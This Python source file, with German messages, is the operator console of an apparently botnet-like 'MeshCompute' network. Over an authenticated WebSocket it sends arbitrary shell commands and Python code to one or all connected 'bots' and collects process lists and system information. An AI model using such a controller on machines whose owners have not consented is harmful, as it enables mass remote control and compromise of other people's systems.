import asyncio
import websockets
import json
import uuid
import cmd
import time
from colorama import init, Fore, Style
from dotenv import load_dotenv
from common.config import SERVER_URL, AUTH_TOKEN

load_dotenv()
init(autoreset=True)


class MeshController(cmd.Cmd):
    intro = f"""{Fore.CYAN}
    =====================================
          MeshCompute Controller v2
    =====================================
    Tippe 'help' oder '?' für Befehle.
    ====================================={Style.RESET_ALL}
    """
    prompt = f"{Fore.GREEN}meshctrl > {Style.RESET_ALL}"

    def __init__(self):
        super().__init__()
        self.ws = None
        self.connected = False
        self.task_id = 0

    def next_task_id(self):
        self.task_id += 1
        return str(self.task_id)

    async def connect(self):
        try:
            self.ws = await websockets.connect(SERVER_URL)

            # Authentifizierung als Controller
            await self.ws.send(json.dumps({
                "type": "controller",
                "auth_token": AUTH_TOKEN
            }))

            self.connected = True
            print(f"{Fore.GREEN}[+] Erfolgreich mit dem Server verbunden{Style.RESET_ALL}")

            # Hintergrund-Task für eingehende Nachrichten
            asyncio.create_task(self.receive_messages())

        except Exception as e:
            print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
            self.connected = False

    def do_sysinfo(self, arg):
        """Systeminformationen eines oder aller Bots"""
        target = arg.strip() or "all"
        asyncio.create_task(self.send_command({
            "type": "command",
            "action": "sysinfo",
            "target": target,
            "task_id": self.next_task_id()
        }))

    def do_python(self, arg):
        """Python Code auf Bot(s) ausführen: python <bot_id|all> <code>"""
        if not arg:
            print("Verwendung: python <bot_id|all> print('Hallo')")
            return
        parts = arg.split(" ", 1)
        target = parts[0]
        code = parts[1] if len(parts) > 1 else ""

        asyncio.create_task(self.send_command({
            "type": "command",
            "action": "python",
            "target": target,
            "payload": code,
            "task_id": self.next_task_id()
        }))

    def do_ps(self, arg):
        """Prozesse auflisten: ps <bot_id|all>"""
        target = arg.strip() or "all"
        asyncio.create_task(self.send_command({
            "type": "command",
            "action": "ps",
            "target": target,
            "task_id": self.next_task_id()
        }))

    async def receive_messages(self):
        try:
            async for message in self.ws:
                data = json.loads(message)

                if data["type"] == "result":
                    bot_id = data.get("bot_id", "Unknown")
                    if "output" in data:
                        print(f"\n{Fore.YELLOW}[{bot_id}] Ausgabe:{Style.RESET_ALL}")
                        print(data["output"])
                    elif "error" in data and data["error"]:
                        print(f"\n{Fore.RED}[{bot_id}] Fehler:{Style.RESET_ALL} {data['error']}")
                    else:
                        print(f"\n{Fore.CYAN}[{bot_id}] {data.get('message', str(data))}{Style.RESET_ALL}")

                elif data["type"] == "bots":
                    print(f"{Fore.CYAN}Verfügbare Bots: {len(data.get('data', {}).get('bots', []))}{Style.RESET_ALL}")
        except:
            self.connected = False

    # ==================== Befehle ====================

    def do_list(self, arg):
        """Zeigt alle verbundenen Bots an"""
        if not self.connected:
            print(f"{Fore.RED}Nicht mit dem Server verbunden.{Style.RESET_ALL}")
            return

        asyncio.create_task(self.send_command({
            "type": "command",
            "action": "list"
        }))

    def do_exec(self, arg):
        """Führt einen Befehl auf einem oder allen Bots aus: exec <bot_id|all> <befehl>"""
        if not arg:
            print("Verwendung: exec <bot_id|all> <befehl>")
            return

        parts = arg.split(" ", 1)
        if len(parts) < 2:
            print("Verwendung: exec <bot_id|all> <befehl>")
            return

        target = parts[0]
        command = parts[1]

        asyncio.create_task(self.send_command({
            "type": "command",
            "action": "exec",
            "target": target,
            "payload": command,
            "task_id": self.next_task_id()
        }))

        print(f"{Fore.BLUE}[→] Befehl gesendet an {target}{Style.RESET_ALL}")

    def do_ping(self, arg):
        """Ping an alle oder einen bestimmten Bot: ping <bot_id|all>"""
        target = arg.strip() or "all"
        asyncio.create_task(self.send_command({
            "type": "command",
            "action": "ping",
            "target": target,
            "task_id": self.next_task_id()
        }))

    async def send_command(self, command: dict):
        if self.ws and self.connected:
            try:
                await self.ws.send(json.dumps(command))
            except:
                print(f"{Fore.RED}Verbindung verloren.{Style.RESET_ALL}")
                self.connected = False

    def do_exit(self, arg):
        """Controller beenden"""
        print(f"{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
        if self.ws:
            asyncio.create_task(self.ws.close())
        return True

    def do_clear(self, arg):
        """Bildschirm leeren"""
        print("\033c", end="")

    # Alias
    do_cls = do_clear


async def main():
    controller = MeshController()
    await controller.connect()

    # Interactive Loop
    while True:
        try:
            if controller.connected:
                cmd_input = await asyncio.get_event_loop().run_in_executor(None, input, controller.prompt)
                if cmd_input.strip():
                    controller.onecmd(cmd_input)
            else:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"Fehler: {e}")


if __name__ == "__main__":
    print(f"{Fore.MAGENTA}MeshCompute Controller wird gestartet...{Style.RESET_ALL}")
    asyncio.run(main())